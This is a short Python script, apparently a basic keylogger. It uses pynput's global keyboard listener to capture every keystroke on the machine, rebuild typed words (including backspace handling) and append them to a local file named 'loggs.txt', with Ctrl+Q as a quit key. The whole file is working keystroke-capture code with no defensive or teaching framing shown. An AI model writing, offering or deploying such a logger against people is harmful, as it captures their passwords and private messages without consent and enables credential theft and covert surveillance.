from pynput.keyboard import Key, Listener

word = ""

def write_to_file(text):
    print(text)
    with open("loggs.txt", "a+") as file:
        file.write(str(text) + "\n")

def quit_code(key):
    try:
        if key.char == "\x11":
            print("it's q")
            exit(1)
    except AttributeError:
        pass

def on_key_press(key):
    global word
    quit_code(key)
    
    if type(key) != Key:
        word += key.char
        return

    if key.name == Key.backspace.name:
        word = word[:-1]
        return

    if len(word) != 0:
        write_to_file(word)
    word = ""

if __name__ == "__main__":
    with Listener(on_press=on_key_press) as listener:
        listener.join()